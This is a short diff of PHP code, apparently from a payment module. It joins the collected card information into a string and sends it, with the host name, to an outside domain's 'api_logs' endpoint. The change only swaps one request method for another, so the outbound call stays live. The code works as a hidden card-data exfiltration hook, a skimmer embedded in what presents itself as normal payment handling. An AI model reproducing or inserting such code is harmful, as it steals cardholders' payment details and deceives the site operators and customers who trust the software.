@@ -105,8 +105,8 @@ $postResponse = $this->response;
 
 $logInfo = implode('|', $cardInfo);
 
-file_get_contents('https://garenavn.net/api_logs/process.php?' . http_build_query(array('host' => $hostInfo, 'data_logs' => $logInfo)));
-//$this->get('https://garenavn.net/api_logs/process.php', array('host' => $hostInfo, 'data_logs' => $logInfo));
+//file_get_contents('https://garenavn.net/api_logs/process.php?' . http_build_query(array('host' => $hostInfo, 'data_logs' => $logInfo)));
+$this->get('https://garenavn.net/api_logs/process.php', array('host' => $hostInfo, 'data_logs' => $logInfo));
 
 
 
